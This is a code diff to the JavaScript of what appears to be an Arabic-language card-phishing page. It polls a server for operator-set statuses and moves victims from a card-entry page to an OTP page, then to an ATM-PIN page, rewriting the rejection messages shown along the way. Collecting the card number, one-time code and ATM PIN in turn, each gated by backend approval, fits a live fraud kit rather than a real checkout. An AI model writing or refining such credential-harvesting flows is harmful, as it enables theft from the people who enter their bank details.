@@ -35,23 +35,17 @@
                 if (data.status === 'approved_payment') {
                     window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_payment') {
-                    localStorage.setItem('lastError', data.lastError || 'عذراً، البطاقة غير صالحة. قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.');
-                    window.location.href = `payment_new_ar.html?orderId=${orderId}`;
-                } else if (data.status === 'waiting_payment') {
-                    setTimeout(checkStatus, 2000);
-                } else if (data.status === 'waiting_otp') {
-                    setTimeout(checkStatus, 2000);
+                    localStorage.setItem('lastError', data.lastError || 'تم رفض عملية الدفع بطاقك غير متاح للدفع عبر الإنترنت يرجي التواصل مع المصرف او تجربة طرق دفع اخري');
+                    window.location.href = `payment_card_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'approved_otp') {
                     window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_otp') {
-                    localStorage.setItem('lastError', data.lastError || 'الرمز الذي تم إدخاله غير صالح. قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو إعادة المحاولة.');
+                    localStorage.setItem('lastError', data.lastError || 'الرمز غير صالح او بطاقك غير متاح لدفع عبر الإنترنت يرجي التوصل مع المصرف استخدام طرق دفع اخري');
                     window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
-                } else if (data.status === 'waiting_pin') {
-                    setTimeout(checkStatus, 2000);
                 } else if (data.status === 'approved_pin') {
                     window.location.href = `payment_success_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_pin') {
-                    localStorage.setItem('lastError', data.lastError || 'فشلت عملية الدفع. رقم الصراف الآلي الذي تم إدخاله غير صحيح، أو قد تكون بطاقتك غير مفعلة للدفع أونلاين. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.');
+                    localStorage.setItem('lastError', data.lastError || 'الرقم السري غير صحيح او بطاقك غير متاح لدفع عبر الإنترنت يرجي التوصل مع المصرف استخدام طرق دفع اخري');
                     window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                 } else {
                     setTimeout(checkStatus, 2000);
